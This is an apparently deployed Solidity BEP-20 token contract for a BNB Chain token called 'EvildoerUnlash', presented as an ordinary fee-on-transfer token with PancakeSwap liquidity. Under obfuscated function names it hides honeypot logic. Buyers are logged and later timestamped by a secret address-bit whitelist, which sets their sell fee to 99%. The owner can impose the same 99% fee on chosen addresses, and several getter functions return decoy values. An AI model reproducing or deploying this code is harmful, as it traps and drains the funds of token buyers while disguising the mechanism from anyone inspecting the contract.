/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract EvildoerUnlash is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Evildoer Unlash ";
    string constant _symbol = "EvildoerUnlash";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private txFeeSellWallet;
    mapping(address => bool) private minLimitSwapLaunched;
    mapping(address => bool) private buyFeeBurnReceiverSellBotsIs;
    mapping(address => bool) private isFeeModeSellExempt;
    mapping(address => uint256) private marketingSwapTeamTradingExempt;
    mapping(uint256 => address) private burnAutoFeeBuy;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private botsMinWalletBurn = 0;
    uint256 private limitSwapExemptMin = 7;

    //SELL FEES
    uint256 private receiverBurnTeamMax = 0;
    uint256 private limitMinIsMaxTradingLaunched = 7;

    uint256 private minFeeLiquidityLimitWallet = limitSwapExemptMin + botsMinWalletBurn;
    uint256 private autoFeeLiquidityMax = 100;

    address private botsBurnModeTeam = (msg.sender); // auto-liq address
    address private sellSwapWalletMarketing = (0x990AFDA08aC3B81d9a168Ab9fffFd13E44968361); // marketing address
    address private tradingSwapAutoFee = DEAD;
    address private autoMaxModeMin = DEAD;
    address private teamBurnModeSellMaxBuyLimit = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private modeMaxBotsTrading;
    uint256 private liquidityReceiverExemptSwap;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private autoLimitLiquidityModeLaunched;
    uint256 private autoModeTradingMin;
    uint256 private exemptSellIsAutoFeeBuyReceiver;
    uint256 private launchedBotsFeeLimitMaxWalletReceiver;
    uint256 private marketingTeamSellTxFeeBurn;

    bool private tradingTeamBuyBotsFee = true;
    bool private isFeeModeSellExemptMode = true;
    bool private walletIsTeamMarketing = true;
    bool private autoWalletExemptLiquidity = true;
    bool private tradingLiquidityExemptMaxLimitMode = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private marketingBurnReceiverWalletTeamTradingAuto = _totalSupply / 1000; // 0.1%

    
    uint256 private burnAutoBuyModeLimitLiquidity;
    uint256 private tradingExemptTxMarketingBurnMaxFee;
    uint256 private feeLiquidityMaxLaunchedModeAutoTeam;
    bool private txBurnWalletLaunched;
    uint256 private receiverIsExemptAuto;
    bool private exemptLimitMinBotsAutoTx;
    uint256 private autoTxLimitTrading;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        autoLimitLiquidityModeLaunched = true;

        txFeeSellWallet[msg.sender] = true;
        txFeeSellWallet[address(this)] = true;

        minLimitSwapLaunched[msg.sender] = true;
        minLimitSwapLaunched[0x0000000000000000000000000000000000000000] = true;
        minLimitSwapLaunched[0x000000000000000000000000000000000000dEaD] = true;
        minLimitSwapLaunched[address(this)] = true;

        buyFeeBurnReceiverSellBotsIs[msg.sender] = true;
        buyFeeBurnReceiverSellBotsIs[0x0000000000000000000000000000000000000000] = true;
        buyFeeBurnReceiverSellBotsIs[0x000000000000000000000000000000000000dEaD] = true;
        buyFeeBurnReceiverSellBotsIs[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return txSwapLaunchedMaxTeam(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return txSwapLaunchedMaxTeam(sender, recipient, amount);
    }

    function txSwapLaunchedMaxTeam(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = minModeSellAuto(sender) || minModeSellAuto(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                minFeeBotsIsWalletModeTrading();
            }
            if (!bLimitTxWalletValue) {
                receiverWalletIsMin(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return burnBotsIsMarketingMax(sender, recipient, amount);}

        if (!txFeeSellWallet[sender] && !txFeeSellWallet[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || buyFeeBurnReceiverSellBotsIs[sender] || buyFeeBurnReceiverSellBotsIs[recipient], "Max TX Limit has been triggered");

        if (tradingSwapLaunchedModeWalletBots()) {botsReceiverModeLiquidityLaunchedBuyBurn();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = sellMinAutoLiquidity(sender) ? launchedModeMaxTeam(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function burnBotsIsMarketingMax(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function sellMinAutoLiquidity(address sender) internal view returns (bool) {
        return !minLimitSwapLaunched[sender];
    }

    function autoReceiverSellFee(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            minFeeLiquidityLimitWallet = limitMinIsMaxTradingLaunched + receiverBurnTeamMax;
            return marketingWalletBuyBots(sender, minFeeLiquidityLimitWallet);
        }
        if (!selling && sender == uniswapV2Pair) {
            minFeeLiquidityLimitWallet = limitSwapExemptMin + botsMinWalletBurn;
            return minFeeLiquidityLimitWallet;
        }
        return marketingWalletBuyBots(sender, minFeeLiquidityLimitWallet);
    }

    function launchedModeMaxTeam(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(autoReceiverSellFee(sender, receiver == uniswapV2Pair)).div(autoFeeLiquidityMax);

        if (isFeeModeSellExempt[sender] || isFeeModeSellExempt[receiver]) {
            feeAmount = amount.mul(99).div(autoFeeLiquidityMax);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function minModeSellAuto(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function marketingWalletBuyBots(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = marketingSwapTeamTradingExempt[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function receiverWalletIsMin(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        burnAutoFeeBuy[exemptLimitValue] = addr;
    }

    function minFeeBotsIsWalletModeTrading() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (marketingSwapTeamTradingExempt[burnAutoFeeBuy[i]] == 0) {
                    marketingSwapTeamTradingExempt[burnAutoFeeBuy[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(sellSwapWalletMarketing).transfer(amountBNB * amountPercentage / 100);
    }

    function tradingSwapLaunchedModeWalletBots() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    tradingLiquidityExemptMaxLimitMode &&
    _balances[address(this)] >= marketingBurnReceiverWalletTeamTradingAuto;
    }

    function botsReceiverModeLiquidityLaunchedBuyBurn() internal swapping {
        uint256 amountToLiquify = marketingBurnReceiverWalletTeamTradingAuto.mul(botsMinWalletBurn).div(minFeeLiquidityLimitWallet).div(2);
        uint256 amountToSwap = marketingBurnReceiverWalletTeamTradingAuto.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = minFeeLiquidityLimitWallet.sub(botsMinWalletBurn.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(botsMinWalletBurn).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(limitSwapExemptMin).div(totalETHFee);

        payable(sellSwapWalletMarketing).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                botsBurnModeTeam,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getAutoMaxModeMin() public view returns (address) {
        if (autoMaxModeMin == tradingSwapAutoFee) {
            return tradingSwapAutoFee;
        }
        return autoMaxModeMin;
    }
    function setAutoMaxModeMin(address a0) public onlyOwner {
        autoMaxModeMin=a0;
    }

    function getIsFeeModeSellExempt(address a0) public view returns (bool) {
        if (isFeeModeSellExempt[a0] != txFeeSellWallet[a0]) {
            return tradingLiquidityExemptMaxLimitMode;
        }
        if (isFeeModeSellExempt[a0] != minLimitSwapLaunched[a0]) {
            return walletIsTeamMarketing;
        }
        if (isFeeModeSellExempt[a0] != buyFeeBurnReceiverSellBotsIs[a0]) {
            return tradingLiquidityExemptMaxLimitMode;
        }
            return isFeeModeSellExempt[a0];
    }
    function setIsFeeModeSellExempt(address a0,bool a1) public onlyOwner {
        if (isFeeModeSellExempt[a0] == txFeeSellWallet[a0]) {
           txFeeSellWallet[a0]=a1;
        }
        if (a0 == autoMaxModeMin) {
            isFeeModeSellExemptMode=a1;
        }
        if (isFeeModeSellExempt[a0] != minLimitSwapLaunched[a0]) {
           minLimitSwapLaunched[a0]=a1;
        }
        isFeeModeSellExempt[a0]=a1;
    }

    function getAutoFeeLiquidityMax() public view returns (uint256) {
        if (autoFeeLiquidityMax == receiverBurnTeamMax) {
            return receiverBurnTeamMax;
        }
        return autoFeeLiquidityMax;
    }
    function setAutoFeeLiquidityMax(uint256 a0) public onlyOwner {
        if (autoFeeLiquidityMax != limitMinIsMaxTradingLaunched) {
            limitMinIsMaxTradingLaunched=a0;
        }
        autoFeeLiquidityMax=a0;
    }

    function getSellSwapWalletMarketing() public view returns (address) {
        if (sellSwapWalletMarketing != tradingSwapAutoFee) {
            return tradingSwapAutoFee;
        }
        if (sellSwapWalletMarketing != sellSwapWalletMarketing) {
            return sellSwapWalletMarketing;
        }
        return sellSwapWalletMarketing;
    }
    function setSellSwapWalletMarketing(address a0) public onlyOwner {
        if (sellSwapWalletMarketing == tradingSwapAutoFee) {
            tradingSwapAutoFee=a0;
        }
        if (sellSwapWalletMarketing == tradingSwapAutoFee) {
            tradingSwapAutoFee=a0;
        }
        sellSwapWalletMarketing=a0;
    }

    function getBuyFeeBurnReceiverSellBotsIs(address a0) public view returns (bool) {
        if (a0 != autoMaxModeMin) {
            return walletIsTeamMarketing;
        }
        if (a0 == teamBurnModeSellMaxBuyLimit) {
            return autoWalletExemptLiquidity;
        }
            return buyFeeBurnReceiverSellBotsIs[a0];
    }
    function setBuyFeeBurnReceiverSellBotsIs(address a0,bool a1) public onlyOwner {
        buyFeeBurnReceiverSellBotsIs[a0]=a1;
    }

    function getBotsBurnModeTeam() public view returns (address) {
        if (botsBurnModeTeam != teamBurnModeSellMaxBuyLimit) {
            return teamBurnModeSellMaxBuyLimit;
        }
        if (botsBurnModeTeam != teamBurnModeSellMaxBuyLimit) {
            return teamBurnModeSellMaxBuyLimit;
        }
        if (botsBurnModeTeam == botsBurnModeTeam) {
            return botsBurnModeTeam;
        }
        return botsBurnModeTeam;
    }
    function setBotsBurnModeTeam(address a0) public onlyOwner {
        if (botsBurnModeTeam != teamBurnModeSellMaxBuyLimit) {
            teamBurnModeSellMaxBuyLimit=a0;
        }
        if (botsBurnModeTeam != tradingSwapAutoFee) {
            tradingSwapAutoFee=a0;
        }
        botsBurnModeTeam=a0;
    }

    function getMarketingSwapTeamTradingExempt(address a0) public view returns (uint256) {
        if (a0 == sellSwapWalletMarketing) {
            return limitSwapExemptMin;
        }
            return marketingSwapTeamTradingExempt[a0];
    }
    function setMarketingSwapTeamTradingExempt(address a0,uint256 a1) public onlyOwner {
        if (a0 == botsBurnModeTeam) {
            autoFeeLiquidityMax=a1;
        }
        if (a0 != teamBurnModeSellMaxBuyLimit) {
            receiverBurnTeamMax=a1;
        }
        marketingSwapTeamTradingExempt[a0]=a1;
    }

    function getMinLimitSwapLaunched(address a0) public view returns (bool) {
        if (a0 != teamBurnModeSellMaxBuyLimit) {
            return tradingLiquidityExemptMaxLimitMode;
        }
        if (a0 == sellSwapWalletMarketing) {
            return tradingTeamBuyBotsFee;
        }
            return minLimitSwapLaunched[a0];
    }
    function setMinLimitSwapLaunched(address a0,bool a1) public onlyOwner {
        minLimitSwapLaunched[a0]=a1;
    }

    function getAutoWalletExemptLiquidity() public view returns (bool) {
        if (autoWalletExemptLiquidity == walletIsTeamMarketing) {
            return walletIsTeamMarketing;
        }
        if (autoWalletExemptLiquidity == walletIsTeamMarketing) {
            return walletIsTeamMarketing;
        }
        return autoWalletExemptLiquidity;
    }
    function setAutoWalletExemptLiquidity(bool a0) public onlyOwner {
        autoWalletExemptLiquidity=a0;
    }

    function getLimitMinIsMaxTradingLaunched() public view returns (uint256) {
        if (limitMinIsMaxTradingLaunched != botsMinWalletBurn) {
            return botsMinWalletBurn;
        }
        if (limitMinIsMaxTradingLaunched != marketingBurnReceiverWalletTeamTradingAuto) {
            return marketingBurnReceiverWalletTeamTradingAuto;
        }
        if (limitMinIsMaxTradingLaunched == botsMinWalletBurn) {
            return botsMinWalletBurn;
        }
        return limitMinIsMaxTradingLaunched;
    }
    function setLimitMinIsMaxTradingLaunched(uint256 a0) public onlyOwner {
        if (limitMinIsMaxTradingLaunched != limitMinIsMaxTradingLaunched) {
            limitMinIsMaxTradingLaunched=a0;
        }
        if (limitMinIsMaxTradingLaunched == limitSwapExemptMin) {
            limitSwapExemptMin=a0;
        }
        if (limitMinIsMaxTradingLaunched == minFeeLiquidityLimitWallet) {
            minFeeLiquidityLimitWallet=a0;
        }
        limitMinIsMaxTradingLaunched=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}